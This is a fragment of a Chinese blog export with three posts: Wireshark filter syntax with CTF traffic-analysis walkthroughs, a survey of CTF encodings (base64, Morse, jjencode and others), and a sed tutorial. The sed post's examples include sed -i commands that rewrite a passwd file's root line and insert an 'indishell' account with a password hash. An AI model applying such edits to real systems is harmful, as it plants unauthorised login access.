</span><br></pre></td></tr></table></figure><p>6.过滤MAC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84  # 过滤目标mac</span><br><span class="line">eth.addr eq A0:00:00:04:C5:84  # src+dst</span><br></pre></td></tr></table></figure><p>7.包长度过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">udp.length &#x3D;&#x3D; 26   # udp本身固定长度8加上udp下面那块数据包之和</span><br><span class="line">tcp.len &gt;&#x3D; 7       # 指的是ip数据包(tcp下面那块数据),不包括tcp本身</span><br><span class="line">ip.len &#x3D;&#x3D; 94      #  除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后</span><br><span class="line">frame.len &#x3D;&#x3D; 119   #  整个数据包长度,从eth开始到最后</span><br><span class="line">eth —&gt; ip or arp —&gt; tcp or udp —&gt; data</span><br></pre></td></tr></table></figure><p>8.tcp参数过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp.flags 显示包含TCP标志的封包。</span><br><span class="line">tcp.flags.syn &#x3D;&#x3D; 0x02     显示包含TCP SYN标志的封包。</span><br><span class="line">tcp.window_size &#x3D;&#x3D; 0 &amp;&amp; tcp.flags.reset !&#x3D; 1</span><br></pre></td></tr></table></figure><p>9.包过滤内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp[20]表示从20开始，取1个字符</span><br><span class="line">tcp[20:]表示从20开始，取1个字符以上</span><br><span class="line">tcp[20:8]表示从20开始，取8个字符</span><br></pre></td></tr></table></figure><p>10.dhcp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bootp.type&#x3D;&#x3D;0x02 and not ip.src&#x3D;&#x3D;192.168.1.1</span><br><span class="line">注意：DHCP协议的检索规则不是dhcp&#x2F;DHCP， 而是bootp</span><br></pre></td></tr></table></figure><p>11.msn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msnms &amp;&amp; tcp[23:1] &#x3D;&#x3D; 20 &#x2F;&#x2F; 第四个是0x20的msn数据包</span><br><span class="line">msnms &amp;&amp; tcp[20:3]&#x3D;&#x3D; &quot;USR&quot; &#x2F;&#x2F; 找到命令编码是USR的数据包</span><br><span class="line">msnms &amp;&amp; tcp[20:3]&#x3D;&#x3D; &quot;MSG&quot; &#x2F;&#x2F; 找到命令编码是MSG的数据包</span><br></pre></td></tr></table></figure><p>12.一些类似正则表达式的规则</p><blockquote><p>小于 le</p><p>等于 eq</p><p>大于 gt</p><p>大于等于  ge</p><p>不等  ne</p><p>\d          0-9的数字</p><p>\D          \d的补集（以所以字符为全集，下同），即所有非数字的字符</p><p>\w          单词字符，指大小写字母、0-9的数字、下划线</p><p>\W          \w的补集</p><p>\s          空白字符，包括换行符\n、回车符\r、制表符\t、垂直制表符\v、换页符\f</p><p>\S          \s的补集</p><p>.          除换行符\n外的任意字符。 在Perl中，“.”可以匹配新行符的模式被称作“单行模式”</p><p>.*       匹配任意文本，不包括回车(\n)? 。 而，[0x00-0xff]*        匹配任意文本,包括\n</p><p>[…]          匹配[]内所列出的所有字符</p><p>[^…]          匹配非[]内所列出的字符</p><p>^          表示其后的字符必须位于字符串的开始处</p><p>$          表示其前面的字符必须位于字符串的结束处</p><p>\b          匹配一个单词的边界</p><p>\B          匹配一个非单词的边界</p><p>{n}          匹配前面的字符n次</p><p>{n,}          匹配前面的字符n次或多于n次</p><p>{n,m}          匹配前面的字符n到m次</p><p>?          匹配前面的字符0或1次</p><p>+          匹配前面的字符1次或多于1次</p><p>*          匹配前面的字符0次或式于0次</p></blockquote><h2 id="互联网五层模型"><a href="#互联网五层模型" class="headerlink" title="互联网五层模型"></a>互联网五层模型</h2><table><thead><tr><th align="center">应用层</th></tr></thead><tbody><tr><td align="center">传输层</td></tr><tr><td align="center">网络层</td></tr><tr><td align="center">数据链路层</td></tr><tr><td align="center">物理层</td></tr></tbody></table><h2 id="ctf例题"><a href="#ctf例题" class="headerlink" title="ctf例题"></a>ctf例题</h2><h3 id="pcapng-sslkey-log-HTTPS流量分析"><a href="#pcapng-sslkey-log-HTTPS流量分析" class="headerlink" title="pcapng + sslkey.log = HTTPS流量分析"></a>pcapng + sslkey.log = HTTPS流量分析</h3><p>两个文件，一个pcapng流量包，一个sslkey.log ： 是明显的TLS封包，也就是HTTPS加密流量，需要<code>借助log日志文件解析流量包</code></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222134705137.png" alt="image-20210222134705137"></p><p><strong>1、配置环境变量</strong></p><p>在Windows的系统环境变量中添加一个名为 “SSLKEYLOGFILE” 的新用户变量，并将其指向您想要日志文件所在的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222140419353.png" alt="image-20210222140419353"></p><p><strong>2、配置wireshark</strong></p><p>点击 编辑——首选项——Protocols——TLS , 将log文件放进去</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222140610310.png" alt="image-20210222140610310"></p><p>打开流量包，搜索字符串 <code>ctf</code> 查看HTTP协议包，右键<code>追踪HTTP流</code> ，发现flag</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222141034364.png" alt="image-20210222141034364"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222140949512.png" alt="image-20210222140949512"></p><h3 id="EXE可执行文件分析"><a href="#EXE可执行文件分析" class="headerlink" title="EXE可执行文件分析"></a>EXE可执行文件分析</h3><p>一个<code>exe</code>文件（不再是简单的pcapng流量包），运行是hello world</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222134011942.png" alt="image-20210222134011942"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222134039766.png" alt="image-20210222134039766"></p><p>打开wireshark的同时各网卡已经在抓取流量了，这时运行exe，选择WLAN网卡监测，寻找其中<code>UDP</code>协议流量，发现其中一个访问<code>52.开头的不寻常流量</code>，找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222134551796.png" alt="image-20210222134551796"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222133847978.png" alt="image-20210222133847978"></p><h3 id="只有TCP协议流的分析"><a href="#只有TCP协议流的分析" class="headerlink" title="只有TCP协议流的分析"></a>只有TCP协议流的分析</h3><p>在右键追踪TCP协议流后，复制所有的16进制</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222143512290.png" alt="image-20210222143512290"></p><p>在010编辑器中粘贴自十六进制文本（Ctrl+Shift+V），可以发现是一张PNG图片</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222143423646.png" alt="image-20210222143423646"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222143615869.png" alt="image-20210222143615869"></p><p>但是这张图片显然不完整，我认为需要依靠同种方法将整张图片拼出来。但是每一个TCP流都是一样的，看来不是拼图游戏了。</p><p>猜测是高不对，把高从原来的50修改成了100，二维码嘛，是个正方形</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222144816893.png" alt="image-20210222144816893"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222144702616.png" alt="image-20210222144702616"></p><p>但是右上角挡住了，还是识别不到信息，需要手动添加识别块，加个正方框</p><h4 id="在线ps"><a href="#在线ps" class="headerlink" title="在线ps"></a>在线ps</h4><blockquote><p>原理是：绿色的区域存储的是<strong>格式信息</strong> ，这些信息是固定的，格式信息需要15bits进行存储，1、0分别用黑白代表</p><p>如下图绿色区域共<code>30</code>个module，两个<code>15</code>都存储着相同的格式信息，来做冗余</p><p><strong>格式信息</strong>的15 bits中，2 bits用于表示纠错等级(Error Correction Level)、3 bits用于表示掩码(Mask)、10 bits用于表示通过BCH Code计算的纠错位</p><p>三个角的方块叫<strong>定位标识</strong>，中间的一黑一白间隔的像桥一样的东东，叫<strong>定时标识</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222162601141.png" alt="image-20210222162601141"></p><p>根据原理获取到了右上角的格式信息，在ps中做法将其补充，还有中间桥一样的定时标识</p><blockquote><p>这里还有一个要注意的，当你准备去识别出格式信息时，一定要对号QR码的等级，这里的等级是4，要自己数一数两个角的黑块相距了几个格子，然后对应好再涂已知的格式信息</p><p>比如，一级中间只有5个格子</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222170018063.png" alt="image-20210222170018063"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222162353310.png" alt="image-20210222162353310"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222164722765.png" alt="image-20210222164722765"></p><blockquote><p>o(╥﹏╥)o 这里花了好长时间去描点，结果用我其中一款识别工具就是怎么都识别不到，我涂了又涂，改了又改，迷茫的我打开微信扫一扫。。。竟然扫出来了！！！气愤！！又用了个在线工具也识别成功，啊太气了，我吐了！(ノ｀Д)ノ</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210222161836175.png" alt="image-20210222161836175"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=4">https://www.bilibili.com/video/BV1VA411u7Tg?p=4</a></p><p><a href="https://segmentfault.com/a/1190000018746027">如何用wireshark抓包TLS封包</a></p><p><a href="https://examine2.top/2020/04/25/%E4%BA%8C%E7%BB%B4%E7%A0%81/">二维码</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc总结之编码转换</title>
      <link href="2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/"/>
      <url>2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="MISC简介"><a href="#MISC简介" class="headerlink" title="MISC简介"></a>MISC简介</h2><p><strong>Misc</strong>为英文miscellaneous的前四个字母，是<code>杂项</code>、<code>混合体</code>、<code>大杂烩</code>的意思</p><p>主要类型有</p><ul><li>数据编码、图形编码</li><li>图片隐写</li><li>音频、视频隐写</li><li>流量分析</li><li>内存取证</li><li>游戏隐写</li></ul><h2 id="数据编码分类"><a href="#数据编码分类" class="headerlink" title="数据编码分类"></a>数据编码分类</h2><h3 id="二进制转换"><a href="#二进制转换" class="headerlink" title="二进制转换"></a>二进制转换</h3><ul><li>十进制</li><li>十六进制</li><li>八进制</li><li>二维码</li><li>图片</li><li>摩尔斯密码</li><li>ASCII码</li><li>…</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210210164516705.png" alt="image-20210210164516705"></p><h3 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h3><blockquote><p>编码原理：根据要求把原本的8位字节算2的N次方的N为单位划分字节，再在前面补充0补充到8位一个Byte的形式</p></blockquote><ul><li><a href="https://www.qtool.net/baseencode">https://www.qtool.net/baseencode</a></li></ul><ol><li><p><code>base64</code>：A-Z,a-z,0-9,+,/ 共64个编码字符， =号属于填充字符</p></li><li><p><code>base62</code>：A-Z,a-z,0-9 共62个编码字符  </p></li><li><p><code>base32</code>：A-Z,2-7  共32个编码字符  （末尾最多6个=）</p></li><li><p><code>base16</code>：A-F,0-9  共16个编码字符   （不会出现=）</p></li><li><p><code>base36</code>：26个字母不区分大小写（要么全大写，要么全小写）,0-9 共36个编码字符</p></li><li><p><code>base58</code>：A-Z,a-z（去掉了容易引起视觉混淆的O，I，l） 1-9 共49+9=58个编码字符</p></li><li><p><code>base85</code>：一种类似于Base64的二进制文本编码形式，通过使用五个ASCII字符来表示四个字节的二进制数据。例如，它用于将图像嵌入到Adobe PDF文件中</p></li><li><p><code>base91</code>：A-Z,a-z,0-9,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}”~  共91个编码字符</p></li><li><p><code>base92</code>：比base91多一个字符〜    共92个编码字符</p></li></ol><h3 id="Morse摩尔斯电码"><a href="#Morse摩尔斯电码" class="headerlink" title="Morse摩尔斯电码"></a>Morse摩尔斯电码</h3><blockquote><p>摩尔斯电码（英语：Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的<a href="https://zh.wikipedia.org/wiki/%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D">英文字母</a>、<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E5%AD%97">数字</a>和<a href="https://zh.wikipedia.org/wiki/%E6%A0%87%E7%82%B9%E7%AC%A6%E5%8F%B7">标点符号</a>。是由美国人<a href="https://zh.wikipedia.org/wiki/%E8%89%BE%E5%B0%94%E8%8F%B2%E5%BE%B7%C2%B7%E7%BB%B4%E5%B0%94">艾尔菲德</a><a href="https://zh.wikipedia.org/wiki/%E8%89%BE%E5%B0%94%E8%8F%B2%E5%BE%B7%C2%B7%E7%BB%B4%E5%B0%94">·</a><a href="https://zh.wikipedia.org/wiki/%E8%89%BE%E5%B0%94%E8%8F%B2%E5%BE%B7%C2%B7%E7%BB%B4%E5%B0%94">维尔</a>与<a href="https://zh.wikipedia.org/wiki/%E8%90%A8%E7%BC%AA%E5%B0%94%C2%B7%E6%91%A9%E5%B0%94%E6%96%AF">萨缪尔</a><a href="https://zh.wikipedia.org/wiki/%E8%90%A8%E7%BC%AA%E5%B0%94%C2%B7%E6%91%A9%E5%B0%94%E6%96%AF">·</a><a href="https://zh.wikipedia.org/wiki/%E8%90%A8%E7%BC%AA%E5%B0%94%C2%B7%E6%91%A9%E5%B0%94%E6%96%AF">摩尔斯</a>在1836年发明。</p><p>摩尔斯电码是一种早期的<a href="https://zh.wikipedia.org/wiki/%E6%95%B8%E7%A2%BC%E5%8C%96">数字化</a>通信形式。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210210170736191.png" alt="image-20210210170736191"></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210210172727304.png" alt="image-20210210172727304"></p><p>The quick brown fox jumps over the lazy dog</p><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><blockquote><p>url编码又叫百分号编码，是统一资源定位（URL）编码方式。</p></blockquote><h3 id="unicode（-u1234-amp-x1234"><a href="#unicode（-u1234-amp-x1234" class="headerlink" title="unicode（\u1234  &amp;#x1234;"></a>unicode（\u1234  &amp;#x1234;</h3><blockquote><p>Unicode，中文又称万国码、国际码、统一码、单一码，是计算机科学领域的业界标准。</p></blockquote><p>两种变现形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\u574f\u5973\u4eba\u4e07\u5c81\uff01</span><br><span class="line">&amp;#x574f;&amp;#x5973;&amp;#x4eba;&amp;#x4e07;&amp;#x5c81;&amp;#xff01;</span><br></pre></td></tr></table></figure><p><strong>例子</strong>：</p><p>\u66\u6c\u61\u67\u7b\u57\u33\u6c\u63\u30\u6d\u65\u21\u7d</p><p>不符号1234四个数的形式，所以要自己添加00</p><p>在线：<a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211012746050.png" alt="image-20210211012746050"></p><h3 id="aaencode（颜文字js加密"><a href="#aaencode（颜文字js加密" class="headerlink" title="aaencode（颜文字js加密"></a>aaencode（颜文字js加密</h3><ul><li><a href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></li></ul><h3 id="jjencode-“-“"><a href="#jjencode-“-“" class="headerlink" title="jjencode  (~__$+$“\\“()():++{}"></a>jjencode  (~__$+$“\\“()():++{}</h3><ul><li><a href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x3D;~[];$&#x3D;&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_&#x3D;($.$_&#x3D;$+&quot;&quot;)[$.$_$]+($._$&#x3D;$.$_[$.__$])+($.$$&#x3D;($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__&#x3D;$.$_[$.$$_])+($.$&#x3D;(!&quot;&quot;+&quot;&quot;)[$.__$])+($._&#x3D;(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$&#x3D;$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$&#x3D;($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+&quot;\\&quot;+$._+$.$_$+$.$$$+$.$__+$.$$$$+&quot;\\&quot;+$._+$.$_$+$.$__$+$.$$$+$._$$+&quot;\\&quot;+$._+$.$__+$.$$$_+$.$_$$+$.$_$_+&quot;\\&quot;+$._+$.$__+$.$$$_+$.___+$.$$$+&quot;\\&quot;+$._+$.$_$+$.$$__+$.$___+$.__$+&quot;\\&quot;+$._+$.$$$$+$.$$$$+$.___+$.__$+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure><h3 id="uuencode"><a href="#uuencode" class="headerlink" title="uuencode"></a>uuencode</h3><ul><li><a href="http://web.chacuo.net/charsetuuencode">http://web.chacuo.net/charsetuuencode</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2Y9V&#x2F;Y:6SY+JZY+B&#39;Y;*![[R!</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210210234625566.png" alt="image-20210210234625566"></p><h3 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h3><blockquote><p>6 个字符<code>[ ]( ) ! +</code>来编写 JavaScript 程序</p></blockquote><ul><li>F12控制台解码</li></ul><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><blockquote><p><code>[]&lt;&gt;+-.</code> 7个字符组成</p></blockquote><h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h3><blockquote><p><code>Ook!</code> 4个字符组成</p></blockquote><h3 id="Short-ook"><a href="#Short-ook" class="headerlink" title="Short ook!"></a>Short ook!</h3><blockquote><p><code>!?.</code> 3个字符组成</p></blockquote><p><strong>注意</strong>：</p><ul><li>上面三种编码都是同一个在线网站解码：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></li></ul><h3 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h3><blockquote><p>敲击码（Tap code）是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的，不同点是是用 K 字母被整合到 C 中。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211000035762.png" alt="image-20210211000035762"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211000103838.png" alt="image-20210211000103838"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">24 15 15 22 22 14 14 23</span><br><span class="line"></span><br><span class="line">I  E  E  G  G  D  D  H</span><br></pre></td></tr></table></figure><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><blockquote><p>矩阵式二维码：QR CODE</p><p>矩阵式二维条码（又称棋盘式二维条码）它是在一个矩形空间通过黑、白像素在矩阵中的不同分布进行编码。在矩阵相应元素位置上，用点（方点、圆点或其他形状）的出现表示二进制“1”，点的不出现表示二进制的“0”，点的排列组合确定了矩阵式二维条码所代表的意义。</p><p>矩阵式二维条码是建立在计算机图像处理技术、组合编码原理等基础上的一种新型图形符号自动识读处理码制。</p></blockquote><p>具有代表性的二维码如下9张：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211000309030.png" alt="image-20210211000309030"></p><p><strong>QR码的基本结构</strong></p><blockquote><p>QR(Quick-Response) code是被广泛使用的一种二维码，解码速度快。</p><p>格式信息：纠错等级</p><p>版本信息：即二维码的规格，QR码符号共有40种规格的矩阵</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211000646495.png" alt="image-20210211000646495"></p><h3 id="稀奇古怪编码"><a href="#稀奇古怪编码" class="headerlink" title="稀奇古怪编码"></a>稀奇古怪编码</h3><h4 id="社会主义核心价值观"><a href="#社会主义核心价值观" class="headerlink" title="社会主义核心价值观"></a>社会主义核心价值观</h4><ul><li><a href="http://www.atoolbox.net/Tool.php?Id=850">http://www.atoolbox.net/Tool.php?Id=850</a></li></ul><h4 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h4><ul><li><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></li></ul><h4 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h4><ul><li><a href="http://hi.pcmoe.net/">http://hi.pcmoe.net/</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=3">https://www.bilibili.com/video/BV1VA411u7Tg?p=3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux sed命令的使用</title>
      <link href="2023/11/28/Linux%20sed%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2023/11/28/Linux%20sed%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Linux sed 命令是利用脚本来处理文本文件。</p><p>sed 可依照脚本的指令来处理、编辑文本文件。</p><p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p><p><strong>语法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br></pre></td></tr></table></figure><p><strong>参数说明</strong></p><blockquote><ul><li>-e &lt;script&gt; 或 –expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。</li><li>-f &lt;script文件&gt; 或 –file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</li><li>-h 或 –help 显示帮助。</li><li>-n 或 –quiet 或 –silent 仅显示script处理后的结果。</li><li>-V 或 –version 显示版本信息。</li></ul></blockquote><p><strong>动作说明</strong></p><blockquote><ul><li>a ：新增，a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)</li><li>c ：取代，c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li><li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li><li>i ：插入，i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li><li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li><li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！</li></ul></blockquote><p><strong>所有的命令只有添加 <code>-i</code> 参数才会生效，不加参数可以先看效果，效果对了在sed后加-i</strong></p><h2 id="添加-后加a-前加i"><a href="#添加-后加a-前加i" class="headerlink" title="添加(后加a 前加i)"></a>添加(后加a 前加i)</h2><p>在第一行前添加 drink tea</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;1i drink tea&#39; passwd</span><br></pre></td></tr></table></figure><p>在第2行后加 red tea</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;2a red tea&#39; passwd</span><br></pre></td></tr></table></figure><p>如果第2行后增加两行以上内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;2a first line 12345 \    # 输入下一行的时候回车</span><br><span class="line">&gt; second line 67890&#39; passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111203643788.png" alt="image-20210111203643788"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111203832185.png" alt="image-20210111203832185"></p><h2 id="删除-d"><a href="#删除-d" class="headerlink" title="删除(d)"></a>删除(d)</h2><p>删除第二行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;2d&#39; passwd</span><br></pre></td></tr></table></figure><p>删除第10行到最后一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;10,$d&#39; passwd</span><br></pre></td></tr></table></figure><p>删除2行到5行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;2,5d&#39; passwd</span><br></pre></td></tr></table></figure><h2 id="替换-c"><a href="#替换-c" class="headerlink" title="替换(c)"></a>替换(c)</h2><p>替换第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;1c root:x:1:1:root:&#x2F;root&#x2F;root:&#x2F;bin&#x2F;bash&#39; passwd</span><br></pre></td></tr></table></figure><p>替换第二行(<code>-i 生效</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;2c indishell:$1$123456$RF7JHkAyN&#x2F;EL3oWgX0.G8&#x2F;:1000:1000:indishell,,,:&#x2F;home&#x2F;indishell:&#x2F;bin&#x2F;bash&#39; passwd</span><br></pre></td></tr></table></figure><h2 id="查看行数-nl"><a href="#查看行数-nl" class="headerlink" title="查看行数(nl)"></a>查看行数(nl)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl passwd</span><br></pre></td></tr></table></figure><p>如果行数结合使用</p><p>显示行数删除第三行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl passwd | sed &#39;3d&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111205417227.png" alt="image-20210111205417227"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.runoob.com/linux/linux-comm-sed.html">https://www.runoob.com/linux/linux-comm-sed.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
